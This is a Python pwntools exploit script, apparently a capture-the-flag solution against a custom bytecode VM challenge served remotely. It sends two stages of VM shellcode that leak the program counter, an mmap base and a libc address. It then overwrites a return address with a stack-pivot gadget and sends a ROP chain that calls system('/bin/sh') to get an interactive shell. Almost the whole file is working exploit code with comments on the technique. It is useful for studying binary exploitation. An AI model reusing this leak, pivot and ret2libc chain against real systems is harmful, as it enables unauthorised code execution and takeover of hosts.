from pwn import *

context.arch = "amd64"

libc = ELF("/usr/lib/libc.so.6")


if args.LOCAL:
    if args.GDB:
        r = gdb.debug(["./a.out"])
    else:
        r = process(["./a.out"])
else:
    r = remote("spclr.ch", 1345)

"""
Two-stage exploit:
    first shellcode 
        -> leak stuff like libc
        -> read second stage shellcode
    second shellcode 
        -> overwrite return address on the stack to rop: `pop rsp; ret`
        -> rest of it is ropchain?

mov x0, 0
.loop:
    rd x1
    str x1, .ovr, x0
    add x0, 1
jl x0, 0x7f, .loop
.ovr:

:assembled:
    b'\x00\x80\x00\x12\x81\x0e\x81\x08\x00\x80\x05\x80\x01\x11\x80\x7f\xf1\xff'

for more shellcode one could use
jl 0, x0, .loop
instead of the other jl instruction
would basically be a 
do {
    // stuff
} while(++x0);
"""



shellcode = b""

# leak pc
# might go wrong if pc was 0x..ff or similar
shellcode += b"\x01\xc0"
shellcode += b"\x01\xc1"
shellcode += b"\x01\xc2"
shellcode += b"\x01\xc3"

# leak mmap address
shellcode += b"\x01\xc4"
shellcode += b"\x01\xc5"
shellcode += b"\x01\xc6"
shellcode += b"\x01\xc7"
shellcode += b"\x01\xc8"
shellcode += b"\x01\xc9"
shellcode += b"\x01\xca"
shellcode += b"\x01\xcb"

# leak libc ret addr ==> libc_start_call_main or sth
shellcode += b"\x01\xf4"
shellcode += b"\x01\xf5"
shellcode += b"\x01\xf6"
shellcode += b"\x01\xf7"
shellcode += b"\x01\xf8"
shellcode += b"\x01\xf9"
shellcode += b"\x01\xfa"
shellcode += b"\x01\xfb"

# read second stage
shellcode += b'\x00\x80\x00\x12\x81\x0e\x81\x08\x00\x80\x05\x80\x01\x11\x80\x7f\xf1\xff'

shellcode_len = len(shellcode)
shellcode = shellcode + b"a"*(0xfd - len(shellcode))
print(shellcode)

def mov_reg_num(r, x):
    if x == 10:
        # 11-1
        return b"\x00" + p8(0x80 | r) + p8(11) + p8(13) + p8(0x80 | r) + p8(1)
    if 256-x == 10:
        return b"\x00" + p8(0x80 | r) + p8(1) + p8(13) + p8(0x80 | r) + p8(257-x)

    if x < 0x80:
        # just mov and a 3-byte nop (mov x0, x0)
        return b"\x00" + p8(0x80 | r) + p8(x) + b"\x00\x80\x80"
    else:
        # mov 0, then sub (256-x) to get -(256-x) = x-256 (mod 256) == x
        return b"\x00" + p8(0x80 | r) + p8(0) + p8(13) + p8(0x80 | r) + p8(256-x)

# ictf else we would exit straight away
# then 0xfd * 's' to fill the buffer until the first
# instruction, then `jmp -0x100`
r.sendline(b"ictf" + shellcode + b"\x0c\x00\xff")


pc = u32(r.recvn(4))
mmap_base = u64(r.recvn(8))
libc_main = u64(r.recvn(8))

libc.address = (libc_main - libc.sym.__libc_start_call_main) & ~0xfff
info("Leaked all the values: %x, %x, %x, ==> %x", pc, mmap_base, libc_main, libc.address)
rop = ROP(libc)

# write return address to be `pop rsp; ret`
payload = b""
for i,b in enumerate(p64(rop.find_gadget(["pop rsp", "ret"]).address)):
    payload += mov_reg_num(0x74+i, b)

# 18 bytes for the read ropchain part + 6*4 for the mov_reg_num part
# we need to subtract 6 because we leak the pc after 6 bytes of the
# original payload
off = 4 + shellcode_len + len(payload) + 18 + 6 * 4 - 6
pos = mmap_base + pc + off
info("current pos: 0x%x", pos)

# ceil to next multiple of 16
filler = pos%0x10
pos = ((pos+0xf)//0x10)*0x10

# we only control four more bytes...
for i,b in enumerate(p64(pos)[:4]): 
    payload += mov_reg_num(0x7c + i, b)

# read ropchain
payload += b'\x00\x80\x00\x12\x81\x0e\x81\x08\x00\x80\x05\x80\x01\x11\x80\x7f\xf1\xff'

payload = payload + b"a"*(0x7e-len(payload))
print(payload)
r.sendline(payload)

ropchain = b"a"*((16 - filler)%0x10)
ropchain += p64(rop.find_gadget(["pop rdi", "ret"]).address)
ropchain += p64(next(libc.search(b"/bin/sh\x00")))
#ropchain += p64(rop.find_gadget(["ret"]).address)
ropchain += p64(libc.sym.system)
ropchain = ropchain + b"a"*(0x7e-len(ropchain))
print(ropchain)
r.sendline(ropchain)

r.recvuntil(b"Failure")
r.sendline(b"ls")

r.interactive()
